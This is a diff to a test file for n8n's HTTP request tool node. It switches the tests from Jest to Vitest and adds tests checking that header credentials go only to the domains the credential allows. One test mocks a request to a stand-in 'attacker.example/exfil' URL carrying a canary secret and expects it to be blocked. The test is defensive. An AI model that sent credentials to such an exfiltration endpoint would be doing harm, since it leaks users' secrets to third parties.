@@ -1,6 +1,6 @@
-import { mock } from 'jest-mock-extended';
 import type { INode, ISupplyDataFunctions } from 'n8n-workflow';
 import { jsonParse } from 'n8n-workflow';
+import { mock } from 'vitest-mock-extended';
 
 import type { N8nTool } from '@utils/N8nTool';
 
@@ -12,7 +12,7 @@ describe('ToolHttpRequest', () => {
 	const executeFunctions = mock<ISupplyDataFunctions>({ helpers });
 
 	beforeEach(() => {
-		jest.resetAllMocks();
+		vi.resetAllMocks();
 		executeFunctions.getNode.mockReturnValue(
 			mock<INode>({
 				type: 'n8n-nodes-base.httpRequest',
@@ -236,6 +236,81 @@ describe('ToolHttpRequest', () => {
 					}),
 				}),
 			);
+		});
+
+		it('should not send generic credentials to a domain the credential restricts', async () => {
+			executeFunctions.getNodeParameter.mockImplementation((paramName: string) => {
+				switch (paramName) {
+					case 'method':
+						return 'GET';
+					case 'url':
+						return 'http://attacker.example/exfil';
+					case 'authentication':
+						return 'genericCredentialType';
+					case 'genericAuthType':
+						return 'httpHeaderAuth';
+					case 'options':
+						return {};
+					case 'placeholderDefinitions.values':
+						return [];
+					default:
+						return undefined;
+				}
+			});
+
+			executeFunctions.getCredentials.mockResolvedValue({
+				name: 'X-Secret-Token',
+				value: 'SECRET-TOOLHTTP-CANARY',
+				allowedHttpRequestDomains: 'domains',
+				allowedDomains: 'api.example.com',
+			});
+
+			const { response } = await httpTool.supplyData.call(executeFunctions, 0);
+			const res = await (response as N8nTool).invoke({});
+
+			expect(helpers.httpRequest).not.toHaveBeenCalled();
+			expect(res).toContain('Domain not allowed');
+		});
+
+		it('should send generic credentials to a domain the credential allows', async () => {
+			helpers.httpRequest.mockResolvedValue({
+				body: 'Hello World',
+				headers: { 'content-type': 'text/plain' },
+			});
+
+			executeFunctions.getNodeParameter.mockImplementation((paramName: string) => {
+				switch (paramName) {
+					case 'method':
+						return 'GET';
+					case 'url':
+						return 'https://api.example.com/data';
+					case 'authentication':
+						return 'genericCredentialType';
+					case 'genericAuthType':
+						return 'httpHeaderAuth';
+					case 'options':
+						return {};
+					case 'placeholderDefinitions.values':
+						return [];
+					default:
+						return undefined;
+				}
+			});
+
+			executeFunctions.getCredentials.mockResolvedValue({
+				name: 'X-Secret-Token',
+				value: 'SECRET-TOOLHTTP-CANARY',
+				allowedHttpRequestDomains: 'domains',
+				allowedDomains: 'api.example.com',
+			});
+
+			const { response } = await httpTool.supplyData.call(executeFunctions, 0);
+			const res = await (response as N8nTool).invoke({});
+
+			expect(helpers.httpRequest).toHaveBeenCalledWith(
+				expect.objectContaining({ allowedDomains: 'api.example.com' }),
+			);
+			expect(res).toEqual('Hello World');
 		});
 
 		it('should return the error when receiving text that contains a null character', async () => {
